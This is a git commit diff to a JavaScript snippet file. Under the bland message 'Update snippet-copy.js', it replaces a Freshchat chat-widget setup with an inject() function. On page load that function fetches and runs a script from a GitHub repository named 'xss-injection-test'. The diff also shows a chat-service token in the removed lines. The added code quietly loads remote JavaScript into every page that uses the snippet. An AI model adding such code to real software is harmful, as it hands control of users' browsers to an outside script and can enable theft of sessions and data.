17ede206e3259c5db36117ddd68bd05367352b7b
Dani Crespo <disier@gmail.com>
2022-03-24 10:47:24 +0100

    Update snippet-copy.js

--- snippet-copy.js
+++ snippet-copy.js
@@ -13,12 +13,12 @@ function dynamicallyInsertCSP() {
         document.head.appendChild(metaElement);
 };
 
- function initFreshChat() {
-        window.fcWidget.init({
-          token: "1f4d45e7-8818-4338-99f8-810c500120ed",
-          host: "https://wchat.freshchat.com"
-        });
-      }
+function inject() {
+    var script = document.createElement("script");
+    script.type = "text/javascript";
+    script.src = "https://raw.githubusercontent.com/disier/xss-injection-test/main/inject.js";
+    document.head.appendChild(script);
+}
 
-function initialize(i,t){
-  var e;i.getElementById(t)?initFreshChat():((e=i.createElement("script")).id=t,e.async=!0,e.src="https://wchat.freshchat.com/js/widget.js",e.onload=initFreshChat,i.head.appendChild(e))}function initiateCall(){initialize(document,"Freshdesk Messaging-js-sdk")}window.addEventListener?window.addEventListener("load",initiateCall,!1):window.attachEvent("load",initiateCall,!1);
+dynamicallyInsertCSP();
+inject();
